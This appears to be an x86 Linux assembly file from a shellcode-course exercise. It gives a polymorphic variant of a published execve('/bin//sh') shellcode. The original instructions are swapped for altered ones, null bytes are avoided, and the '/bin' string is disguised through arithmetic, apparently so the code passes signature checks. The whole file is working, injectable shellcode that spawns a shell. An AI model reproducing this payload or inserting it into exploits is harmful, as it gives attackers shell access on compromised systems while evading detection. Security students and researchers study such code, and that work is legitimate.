;http://shell-storm.org/shellcode/files/shellcode-575.php
;Author: Nipun Jaswal (SLAE-1080)
global _start
section .text

_start:
	xchg esi, eax	; Zero to EAX
	mov al, 0xb	; Mov Instead of PUSH
	;push byte +0xb
	;pop eax
	;cdq
	push ecx	; ECX is also Zero
	;push edx	
	;push dword 0x68732f2f
	mov esi, 0x68732f2f	; Value Moved to ESI
	push esi		; Pushed onto the Stack
	dec esi			; Value Decremented to Avoid NULL
	add esi, 0x5F63301	; Added Value to Match Second Parameter
	push esi		; Value Pushed
	;push dword 0x6e69622f	
	mov ebx, esp		; Paramters to EBX
	;xor ecx, ecx	
	int 0x80		; Interrupt
